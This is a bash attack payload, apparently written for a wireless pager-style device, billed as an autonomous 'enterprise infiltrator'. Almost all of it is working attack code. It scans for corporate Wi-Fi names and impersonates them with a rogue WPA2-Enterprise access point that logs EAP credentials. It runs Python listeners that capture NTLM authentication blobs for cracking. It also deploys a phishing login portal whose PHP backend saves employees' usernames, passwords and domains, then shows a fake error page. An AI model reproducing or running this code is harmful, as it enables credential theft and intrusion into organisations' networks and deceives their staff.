#!/bin/bash
# ============================================================
# NullSec: Zero-Click Enterprise Infiltrator
# Author: bad-antics
# Description: Autonomous enterprise network infiltration
# Category: pager/enterprise
# 
# UNIQUE FEATURES:
# - Auto-detects enterprise SSIDs (PEAP, EAP-TLS patterns)
# - Creates convincing enterprise-style captive portals
# - Harvests domain credentials via RADIUS impersonation
# - Exfiltrates AD hashes via NTLM relay on WiFi
# - Self-adapting SSID mimicry based on probe analysis
# ============================================================

PAYLOAD_NAME="ZeroClick Enterprise Infiltrator"
VERSION="1.0.0"
LOOT="/root/loot/enterprise"
LOG="/root/loot/enterprise/infiltrator.log"

# Color codes for pager display
RED='\033[0;31m'
GREEN='\033[0;32m'
CYAN='\033[0;36m'
NC='\033[0m'

init_payload() {
    mkdir -p "$LOOT"/{creds,hashes,profiles,pcaps}
    echo "[$(date)] $PAYLOAD_NAME v$VERSION started" >> "$LOG"
    
    # Pager notification
    NOTIFY "ENTERPRISE INFILTRATOR" "Initializing autonomous mode..."
}

# Analyze probes for enterprise patterns
analyze_enterprise_probes() {
    local PROBE_FILE="/tmp/enterprise_probes.txt"
    
    NOTIFY "PROBE ANALYSIS" "Scanning for enterprise networks..."
    
    # Capture probes for 30 seconds
    timeout 30 tcpdump -i wlan0 -e -s 256 type mgt subtype probe-req 2>/dev/null | \
        grep -oE 'SSID=[^,]+' | cut -d= -f2 | sort -u > "$PROBE_FILE"
    
    # Enterprise SSID patterns
    ENTERPRISE_PATTERNS=(
        "Corp" "Corporate" "Enterprise" "Office" "Internal"
        "Secure" "Staff" "Employee" "Company" "Domain"
        "AD-" "DOMAIN-" "HQ-" "WPA2-Enterprise"
    )
    
    # Find matching enterprise SSIDs
    > /tmp/target_ssids.txt
    for pattern in "${ENTERPRISE_PATTERNS[@]}"; do
        grep -i "$pattern" "$PROBE_FILE" >> /tmp/target_ssids.txt 2>/dev/null
    done
    
    # Also detect EAP networks from beacons
    airodump-ng wlan0 --write-interval 1 -w /tmp/ent_scan --output-format csv &
    sleep 15
    killall airodump-ng 2>/dev/null
    
    # Parse for WPA2-Enterprise (EAP/802.1X)
    grep "WPA2" /tmp/ent_scan*.csv 2>/dev/null | grep -v "PSK" | \
        awk -F',' '{print $14}' | tr -d ' ' >> /tmp/target_ssids.txt
    
    TARGET_COUNT=$(sort -u /tmp/target_ssids.txt | wc -l)
    NOTIFY "TARGETS FOUND" "$TARGET_COUNT enterprise networks detected"
    
    echo "$TARGET_COUNT"
}

# Create EAP credential harvester
deploy_eap_harvester() {
    local TARGET_SSID="$1"
    
    NOTIFY "EAP HARVESTER" "Deploying for: $TARGET_SSID"
    
    # Create FreeRADIUS config for credential capture
    cat > /tmp/eap_users << 'EAPUSERS'
# Accept any identity for harvesting
DEFAULT     Auth-Type := Accept
EAPUSERS

    # Create radiusd config
    cat > /tmp/radiusd.conf << 'RADIUSCONF'
prefix = /usr
exec_prefix = /usr
sysconfdir = /etc
localstatedir = /var
sbindir = ${exec_prefix}/sbin
logdir = /var/log/freeradius
raddbdir = /etc/freeradius/3.0
radacctdir = ${logdir}/radacct
name = freeradius
confdir = ${raddbdir}
run_dir = ${localstatedir}/run/${name}
db_dir = ${localstatedir}/lib/freeradius
libdir = /usr/lib/freeradius
pidfile = ${run_dir}/${name}.pid
max_request_time = 30
cleanup_delay = 5
max_requests = 1024
hostname_lookups = no

log {
    destination = files
    file = /root/loot/enterprise/radius.log
    syslog_facility = daemon
    stripped_names = no
    auth = yes
    auth_badpass = yes
    auth_goodpass = yes
}
RADIUSCONF

    # Hostapd with EAP
    cat > /tmp/hostapd_eap.conf << HOSTAPD
interface=wlan1
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=6
ieee8021x=1
eap_server=1
eap_user_file=/tmp/eap_users
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
wpa=2
wpa_key_mgmt=WPA-EAP
rsn_pairwise=CCMP
HOSTAPD

    # Start the harvester
    hostapd /tmp/hostapd_eap.conf -B 2>/dev/null
    
    # Log credential attempts
    tail -f /root/loot/enterprise/radius.log 2>/dev/null | while read line; do
        if echo "$line" | grep -qE "User-Name|User-Password|MS-CHAP"; then
            echo "[$(date)] $line" >> "$LOOT/creds/eap_harvest.txt"
            NOTIFY "CREDENTIAL" "EAP cred captured!"
        fi
    done &
}

# NTLM hash capture via SMB relay over WiFi
deploy_ntlm_relay() {
    NOTIFY "NTLM RELAY" "Setting up hash capture..."
    
    # Create responder-style listener
    cat > /tmp/ntlm_capture.py << 'PYTHON'
#!/usr/bin/env python3
import socket
import struct
import datetime

LOOT_DIR = "/root/loot/enterprise/hashes"

def capture_ntlm():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    sock.bind(('0.0.0.0', 445))
    sock.listen(5)
    
    print("[*] NTLM Capture listening on 445")
    
    while True:
        try:
            conn, addr = sock.accept()
            data = conn.recv(4096)
            
            # Look for NTLMSSP signature
            if b'NTLMSSP' in data:
                timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
                
                # Extract and save raw data for offline cracking
                with open(f"{LOOT_DIR}/ntlm_{addr[0]}_{timestamp}.bin", "wb") as f:
                    f.write(data)
                
                # Try to extract username
                if b'NTLMSSP\x00\x03' in data:  # Type 3 message
                    print(f"[+] NTLM Auth from {addr[0]}")
                    
                    # Log for notification
                    with open(f"{LOOT_DIR}/captures.log", "a") as f:
                        f.write(f"{timestamp} | {addr[0]} | NTLM Type 3\n")
            
            conn.close()
        except Exception as e:
            pass

if __name__ == "__main__":
    capture_ntlm()
PYTHON

    chmod +x /tmp/ntlm_capture.py
    python3 /tmp/ntlm_capture.py &
    
    # Also capture via HTTP NTLM
    cat > /tmp/http_ntlm.py << 'HTTPNTLM'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import base64

class NTLMHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        auth = self.headers.get('Authorization', '')
        
        if not auth:
            # Request NTLM auth
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'NTLM')
            self.send_header('Content-Length', '0')
            self.end_headers()
        elif auth.startswith('NTLM '):
            # Capture NTLM blob
            blob = base64.b64decode(auth[5:])
            with open(f"/root/loot/enterprise/hashes/http_ntlm_{self.client_address[0]}.bin", "wb") as f:
                f.write(blob)
            
            self.send_response(401)
            self.send_header('WWW-Authenticate', 'NTLM')
            self.end_headers()
    
    def log_message(self, format, *args):
        pass

HTTPServer(('0.0.0.0', 8080), NTLMHandler).serve_forever()
HTTPNTLM

    python3 /tmp/http_ntlm.py &
}

# Auto-generate convincing enterprise portal
create_enterprise_portal() {
    local COMPANY_NAME="$1"
    local PORTAL_DIR="/www/enterprise"
    
    mkdir -p "$PORTAL_DIR"
    
    NOTIFY "PORTAL GEN" "Creating $COMPANY_NAME portal..."
    
    cat > "$PORTAL_DIR/index.html" << 'PORTAL'
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Corporate Network Authentication</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', system-ui, sans-serif;
            background: linear-gradient(135deg, #0f2027 0%, #203a43 50%, #2c5364 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .login-container {
            background: rgba(255,255,255,0.95);
            border-radius: 12px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 420px;
            padding: 40px;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo h1 {
            color: #1a365d;
            font-size: 24px;
            font-weight: 600;
        }
        .logo p {
            color: #718096;
            font-size: 14px;
            margin-top: 8px;
        }
        .security-badge {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 8px;
            background: #ebf8ff;
            padding: 12px;
            border-radius: 8px;
            margin-bottom: 25px;
        }
        .security-badge svg { width: 20px; height: 20px; fill: #3182ce; }
        .security-badge span { color: #2c5282; font-size: 13px; }
        .form-group {
            margin-bottom: 20px;
        }
        .form-group label {
            display: block;
            color: #4a5568;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 8px;
        }
        .form-group input {
            width: 100%;
            padding: 14px 16px;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            font-size: 15px;
            transition: all 0.2s;
        }
        .form-group input:focus {
            outline: none;
            border-color: #3182ce;
            box-shadow: 0 0 0 3px rgba(49,130,206,0.1);
        }
        .remember-row {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 25px;
        }
        .remember-row label {
            display: flex;
            align-items: center;
            gap: 8px;
            color: #4a5568;
            font-size: 14px;
            cursor: pointer;
        }
        .remember-row a {
            color: #3182ce;
            text-decoration: none;
            font-size: 14px;
        }
        .submit-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #3182ce, #2c5282);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        .submit-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(49,130,206,0.3);
        }
        .footer {
            text-align: center;
            margin-top: 25px;
            color: #a0aec0;
            font-size: 12px;
        }
        .mfa-notice {
            background: #fffaf0;
            border-left: 4px solid #ed8936;
            padding: 12px;
            border-radius: 0 8px 8px 0;
            margin-bottom: 20px;
            font-size: 13px;
            color: #744210;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h1>🏢 COMPANY_NAME_PLACEHOLDER</h1>
            <p>Secure Network Access Portal</p>
        </div>
        
        <div class="security-badge">
            <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/></svg>
            <span>Protected by 256-bit TLS Encryption</span>
        </div>
        
        <div class="mfa-notice">
            ⚠️ Multi-factor authentication may be required after sign-in.
        </div>
        
        <form action="/auth" method="POST" id="loginForm">
            <div class="form-group">
                <label>Corporate Email / Username</label>
                <input type="text" name="username" placeholder="user@company.com" required autocomplete="username">
            </div>
            
            <div class="form-group">
                <label>Password</label>
                <input type="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
            </div>
            
            <div class="form-group">
                <label>Domain (Optional)</label>
                <input type="text" name="domain" placeholder="CORP" autocomplete="organization">
            </div>
            
            <div class="remember-row">
                <label><input type="checkbox" name="remember"> Keep me signed in</label>
                <a href="#">Forgot password?</a>
            </div>
            
            <button type="submit" class="submit-btn">Sign In to Network</button>
        </form>
        
        <div class="footer">
            © 2026 COMPANY_NAME_PLACEHOLDER IT Security<br>
            <small>Unauthorized access is prohibited and monitored</small>
        </div>
    </div>
    
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            // Add client fingerprint
            var fp = {
                screen: screen.width + 'x' + screen.height,
                tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
                lang: navigator.language,
                platform: navigator.platform
            };
            var input = document.createElement('input');
            input.type = 'hidden';
            input.name = 'fingerprint';
            input.value = JSON.stringify(fp);
            this.appendChild(input);
        });
    </script>
</body>
</html>
PORTAL

    # Replace company name
    sed -i "s/COMPANY_NAME_PLACEHOLDER/$COMPANY_NAME/g" "$PORTAL_DIR/index.html"
    
    # Create credential capture endpoint
    cat > "$PORTAL_DIR/auth.php" << 'PHP'
<?php
$loot = "/root/loot/enterprise/creds/portal_" . date("Ymd") . ".txt";
$data = [
    'timestamp' => date('Y-m-d H:i:s'),
    'ip' => $_SERVER['REMOTE_ADDR'],
    'user_agent' => $_SERVER['HTTP_USER_AGENT'],
    'username' => $_POST['username'] ?? '',
    'password' => $_POST['password'] ?? '',
    'domain' => $_POST['domain'] ?? '',
    'fingerprint' => $_POST['fingerprint'] ?? '',
];
file_put_contents($loot, json_encode($data) . "\n", FILE_APPEND);

// Show convincing "connecting" page then error
?>
<!DOCTYPE html>
<html>
<head><title>Authenticating...</title>
<style>
body { font-family: 'Segoe UI', sans-serif; background: #1a365d; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
.loader { text-align: center; }
.spinner { width: 50px; height: 50px; border: 4px solid rgba(255,255,255,0.3); border-top-color: white; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
@keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>
<div class="loader">
    <div class="spinner"></div>
    <h2>Authenticating...</h2>
    <p>Verifying credentials with domain controller</p>
</div>
<script>
setTimeout(function() {
    document.body.innerHTML = '<div class="loader"><h2>⚠️ Authentication Error</h2><p>Unable to reach domain controller. Please try again later or contact IT support.</p><br><a href="/" style="color:#63b3ed">← Return to login</a></div>';
}, 3000);
</script>
</body>
</html>
PHP
}

# Main autonomous loop
autonomous_mode() {
    NOTIFY "AUTONOMOUS" "Starting infiltration cycle..."
    
    while true; do
        # Phase 1: Probe analysis
        TARGET_COUNT=$(analyze_enterprise_probes)
        
        if [ "$TARGET_COUNT" -gt 0 ]; then
            # Get top target
            TOP_TARGET=$(head -1 /tmp/target_ssids.txt | tr -d ' ')
            
            # Extract company name from SSID
            COMPANY=$(echo "$TOP_TARGET" | sed 's/-.*//;s/_.*//;s/Corp.*//i')
            [ -z "$COMPANY" ] && COMPANY="Corporate"
            
            # Phase 2: Deploy portal
            create_enterprise_portal "$COMPANY"
            
            # Phase 3: Deploy EAP harvester
            deploy_eap_harvester "$TOP_TARGET"
            
            # Phase 4: Deploy NTLM relay
            deploy_ntlm_relay
            
            # Run for 10 minutes then reassess
            NOTIFY "ACTIVE" "Infiltration running for 10m..."
            sleep 600
            
            # Check loot
            CRED_COUNT=$(wc -l < "$LOOT/creds/portal_"*.txt 2>/dev/null || echo 0)
            HASH_COUNT=$(ls "$LOOT/hashes/"*.bin 2>/dev/null | wc -l || echo 0)
            
            NOTIFY "HARVEST" "Creds: $CRED_COUNT | Hashes: $HASH_COUNT"
        else
            NOTIFY "SCANNING" "No enterprise targets. Retrying in 5m..."
            sleep 300
        fi
    done
}

# Pager notification helper
NOTIFY() {
    local TITLE="$1"
    local MSG="$2"
    
    # Send to pager display
    echo -e "${CYAN}[$TITLE]${NC} $MSG"
    
    # Also log
    echo "[$(date '+%H:%M:%S')] [$TITLE] $MSG" >> "$LOG"
    
    # Pager LED feedback
    pager_led blink green 2>/dev/null
}

# Cleanup on exit
cleanup() {
    NOTIFY "SHUTDOWN" "Cleaning up..."
    killall hostapd dnsmasq python3 php 2>/dev/null
    iptables -t nat -F
    exit 0
}

trap cleanup INT TERM

# Entry point
init_payload
autonomous_mode
